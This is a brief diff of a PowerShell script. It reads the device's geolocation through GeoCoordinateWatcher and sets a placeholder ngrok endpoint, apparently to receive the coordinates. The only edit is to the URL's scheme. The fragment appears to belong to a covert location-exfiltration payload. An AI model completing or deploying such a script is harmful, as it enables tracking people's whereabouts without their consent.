@@ -3,7 +3,7 @@ Add-Type -AssemblyName System.Device
 $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
 $GeoWatcher.Start() 
 
-$ngrokServer = 'http://ngrok_link/index.php'
+$ngrokServer = 'ngrok_link/index.php'
 
 
 while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
